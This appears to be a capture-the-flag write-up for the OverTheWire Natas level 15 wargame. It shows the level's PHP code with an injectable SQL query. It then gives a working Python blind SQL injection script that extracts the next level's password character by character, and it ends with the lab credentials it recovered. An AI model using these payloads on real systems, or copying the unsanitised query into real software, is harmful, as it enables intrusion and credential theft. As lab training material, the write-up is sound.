This level is also an SQL level. 

```php
<?php
/*
CREATE TABLE `users` (
	`username` varchar(64) DEFAULT NULL,
	`password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
	$link = mysqli_connect('localhost', 'natas15', '<censored>');
	mysqli_select_db($link, 'natas15');
	
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
	if(array_key_exists("debug", $_GET)) {
		echo "Executing query: $query<br>";
	}
	
	$res = mysqli_query($link, $query);
	if($res) {
		if(mysqli_num_rows($res) > 0) {
			echo "This user exists.<br>";
		} else {
			echo "This user doesn't exist.<br>";
		}
	} else {
		echo "Error in query.<br>";
	}
mysqli_close($link);
} else {
?>
```

This will check for user existence. If I try to input `natas16` into the input field, it says that `This user exists`. The query selects both fields of the `users` table. This won't show any database information to us, only 3 different types of response based on our query. If the query is correct and it returns a user, it would notify us that the user exists, else it will notify us that the user doesn't exist, otherwise the query is wrong.

For this, we can try brute forcing the password by using a python script:
```python
import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

character_set = string.ascii_letters + string.digits
flag_dictionary = ''
exist_string = 'This user exists.'

# building possible character dictionary for the password
for char in character_set:
    data = {'username' : 'natas16" AND password LIKE BINARY "%' + char + '%"#'}
    response = requests.post(url, auth=(username, password), data=data)

    if exist_string in response.text:
        flag_dictionary += char
        print(f'Flag dictionary: {flag_dictionary}')

print(f'Complete dictionary: {flag_dictionary}')
print('\nBrute forcing...')

correct_flag = ''

# since flag length is 32, try every 32-character strings based on the flag dictionary
for i in range(32):
    for char in flag_dictionary:
        data = {'username' : 'natas16" AND password LIKE BINARY "' + correct_flag + char + '%"#'}
        response = requests.post(url, auth=(username, password), data=data)

        if exist_string in response.text:
            correct_flag += char
            print(f'Building flag: {correct_flag}')
            break

print(f'Correct flag: {correct_flag}')
```

This script works by first building a flag dictionary, containing all the characters that is known to be in the password field. This helps narrow down the search parameter. Then we brute force each character one-by-one from start to finish.

Here's the result:
```py
natas16 password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```